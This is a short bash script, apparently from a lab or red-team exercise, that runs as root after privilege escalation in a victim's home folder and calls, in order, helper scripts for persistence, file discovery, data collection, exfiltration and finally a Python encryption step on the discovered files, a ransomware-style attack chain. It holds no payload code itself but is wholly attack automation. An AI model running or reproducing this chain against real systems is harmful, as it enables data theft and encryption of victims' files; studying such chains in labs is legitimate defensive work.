#!/bin/bash

# ONLY EXECUTED AFTER GETTING PE, AS ROOT
echo "[+] Ensure we are at home folder of the victim where scripts were downloaded"
cd /home/resch/.scripts
echo "[+] Check dependencies for encryption"
# Install requirements after getting root
./check.sh
pip3 install -r ./requirements.txt
echo "[+] Starting persistence..."
# Start Persistence
./Gp5_persistence1.sh
echo "[+] Persistence ended, do vagrant up --provision once everything is done..."
echo "[+] Starting file discovery..."
# Start File discovery
./Gp5_file_and_dir_discovery.sh
./Gp5_file_and_dir_discovery-stripped.sh
echo "[+] File discovery ended..."
echo "[+] Starting collection..."
# Start Collection
./Gp5_collectiontarget.sh
echo "[+] Collection ended..."
echo "[+] Starting exfiltration..."
# Start Exfiltration
./Gp5_exfiltration_target.sh
echo "[+] Exfiltration ended..."
echo "[+] Starting encryption..."
# Start Encryption
python3 Gp5_encrypt.py fndd-stripped.txt
echo "[+] Encryption ended..."
